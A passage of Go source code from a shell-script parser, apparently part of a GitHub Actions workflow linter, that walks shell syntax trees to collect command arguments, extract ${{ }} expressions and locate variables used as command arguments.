			p.collectPipeInputArgsInto(cond, args)
		}
		for _, do := range x.Do {
			p.collectPipeInputArgsInto(do, args)
		}
	case *syntax.ForClause:
		for _, do := range x.Do {
			p.collectPipeInputArgsInto(do, args)
		}
	case *syntax.CaseClause:
		if x.Word != nil {
			p.collectPipeInputArgsInto(x.Word, args)
		}
		for _, item := range x.Items {
			p.collectPipeInputArgsInto(item, args)
		}
	case *syntax.CaseItem:
		for _, pattern := range x.Patterns {
			p.collectPipeInputArgsInto(pattern, args)
		}
		for _, stmt := range x.Stmts {
			p.collectPipeInputArgsInto(stmt, args)
		}
	case *syntax.FuncDecl:
		p.collectPipeInputArgsInto(x.Body, args)
	case *syntax.ProcSubst:
		for _, stmt := range x.Stmts {
			p.collectPipeInputArgsInto(stmt, args)
		}
	case *syntax.DeclClause:
		for _, assign := range x.Args {
			p.collectPipeInputArgsInto(assign, args)
		}
	case *syntax.Assign:
		if x.Value != nil {
			p.collectPipeInputArgsInto(x.Value, args)
		}
		if x.Array != nil {
			p.collectPipeInputArgsInto(x.Array, args)
		}
	case *syntax.ArrayExpr:
		for _, elem := range x.Elems {
			p.collectPipeInputArgsInto(elem, args)
		}
	case *syntax.ArrayElem:
		if x.Value != nil {
			p.collectPipeInputArgsInto(x.Value, args)
		}
	case *syntax.CoprocClause:
		p.collectPipeInputArgsInto(x.Stmt, args)
	case *syntax.TimeClause:
		if x.Stmt != nil {
			p.collectPipeInputArgsInto(x.Stmt, args)
		}
	case *syntax.Word:
		for _, part := range x.Parts {
			p.collectPipeInputArgsInto(part, args)
		}
	case *syntax.DblQuoted:
		for _, part := range x.Parts {
			p.collectPipeInputArgsInto(part, args)
		}
	case *syntax.CmdSubst:
		for _, stmt := range x.Stmts {
			p.collectPipeInputArgsInto(stmt, args)
		}
	}
}

func (p *ShellParser) parseCommandArg(word *syntax.Word) CommandArg {
	rawValue := p.wordToString(word)
	literalValue := p.extractLiteralValue(word)

	arg := CommandArg{
		Value:        rawValue,
		LiteralValue: literalValue,
		Position:     word.Pos(),
	}

	if strings.HasPrefix(literalValue, "-") {
		arg.IsFlag = true
	}

	p.analyzeWordParts(word, &arg)

	return arg
}

func (p *ShellParser) extractLiteralValue(word *syntax.Word) string {
	var result strings.Builder

	for _, part := range word.Parts {
		p.extractLiteralFromPart(part, &result)
	}

	return result.String()
}

func (p *ShellParser) extractLiteralFromPart(part syntax.WordPart, result *strings.Builder) {
	switch x := part.(type) {
	case *syntax.Lit:
		result.WriteString(x.Value)
	case *syntax.DblQuoted:
		for _, inner := range x.Parts {
			p.extractLiteralFromPart(inner, result)
		}
	case *syntax.SglQuoted:
		result.WriteString(x.Value)
	case *syntax.ParamExp:
		if x.Param != nil {
			if x.Short {
				result.WriteString("$")
				result.WriteString(x.Param.Value)
			} else {
				result.WriteString("${")
				result.WriteString(x.Param.Value)
				result.WriteString("}")
			}
		}
	case *syntax.CmdSubst:
		var buf bytes.Buffer
		printer := syntax.NewPrinter()
		if err := printer.Print(&buf, x); err == nil {
			result.WriteString(buf.String())
		}
	}
}

func (p *ShellParser) wordToString(word *syntax.Word) string {
	var buf bytes.Buffer
	printer := syntax.NewPrinter()
	if err := printer.Print(&buf, word); err != nil {
		return ""
	}
	return strings.TrimSpace(buf.String())
}

func (p *ShellParser) analyzeWordParts(word *syntax.Word, arg *CommandArg) {
	rawValue := arg.Value
	ghaExprs := extractGHAExpressionsFromString(rawValue)
	arg.GHAExprs = ghaExprs

	syntax.Walk(word, func(node syntax.Node) bool {
		if paramExp, ok := node.(*syntax.ParamExp); ok {
			if paramExp.Param != nil && paramExp.Param.Value != "" {
				arg.VarNames = append(arg.VarNames, paramExp.Param.Value)
			}
		}
		return true
	})
}

func extractGHAExpressionsFromString(s string) []string {
	var exprs []string
	offset := 0

	for {
		idx := strings.Index(s[offset:], "${{")
		if idx == -1 {
			break
		}

		start := offset + idx
		endIdx := strings.Index(s[start:], "}}")
		if endIdx == -1 {
			break
		}

		expr := strings.TrimSpace(s[start+3 : start+endIdx])
		exprs = append(exprs, expr)

		offset = start + endIdx + 2
	}

	return exprs
}

func (p *ShellParser) FindVarUsageAsCommandArg(varName string, cmdNames []string) []VarArgUsage {
	if p.file == nil {
		return nil
	}

	var usages []VarArgUsage
	cmdNameMap := make(map[string]bool)
	for _, cmd := range cmdNames {
		cmdNameMap[cmd] = true
	}

	syntax.Walk(p.file, func(node syntax.Node) bool {
		if call, ok := node.(*syntax.CallExpr); ok {
			cmdName := p.getCommandName(call)
			if !cmdNameMap[cmdName] {
				return true
			}

			doubleDashPos := p.findDoubleDashPosition(call)
			for argIdx, arg := range call.Args[1:] {
				actualIdx := argIdx + 1
				p.findVarInArg(arg, varName, cmdName, actualIdx, doubleDashPos, &usages)
			}
		}
		return true
	})

	return usages
}

func (p *ShellParser) findDoubleDashPosition(call *syntax.CallExpr) int {
	for i, arg := range call.Args[1:] {
		var buf bytes.Buffer
		printer := syntax.NewPrinter()
		if err := printer.Print(&buf, arg); err != nil {
			continue
		}
		if strings.TrimSpace(buf.String()) == "--" {
			return i + 1
		}
	}
	return -1
}

func (p *ShellParser) findVarInArg(node syntax.Node, varName string, cmdName string, argPos int, doubleDashPos int, usages *[]VarArgUsage) {
	if node == nil {
		return
	}

	switch x := node.(type) {
	case *syntax.Word:
		for _, part := range x.Parts {
			p.findVarInArg(part, varName, cmdName, argPos, doubleDashPos, usages)
		}
	case *syntax.DblQuoted:
		for _, part := range x.Parts {
			p.findVarInArg(part, varName, cmdName, argPos, doubleDashPos, usages)
		}
	case *syntax.ParamExp:
		if x.Param != nil && x.Param.Value == varName {
			usage := VarArgUsage{
				ShellVarUsage: ShellVarUsage{
					VarName:    varName,
					StartPos:   int(x.Pos().Offset()), //nolint:gosec // byte offset of workflow shell scripts cannot realistically overflow int
					EndPos:     int(x.End().Offset()), //nolint:gosec // byte offset of workflow shell scripts cannot realistically overflow int
					IsQuoted:   p.isParamExpQuoted(x),
					InEval:     false,
					InShellCmd: false,
					InCmdSubst: false,
					Context:    p.getContextFromPos(int(x.Pos().Offset()), int(x.End().Offset())), //nolint:gosec // byte offset of workflow shell scripts cannot realistically overflow int
				},
				CommandName:       cmdName,
				ArgPosition:       argPos,
				HasDoubleDash:     doubleDashPos != -1,
				IsAfterDoubleDash: doubleDashPos != -1 && argPos > doubleDashPos,
			}
			*usages = append(*usages, usage)
		}
		if x.Exp != nil && x.Exp.Word != nil {
			p.findVarInArg(x.Exp.Word, varName, cmdName, argPos, doubleDashPos, usages)
		}
	}
}
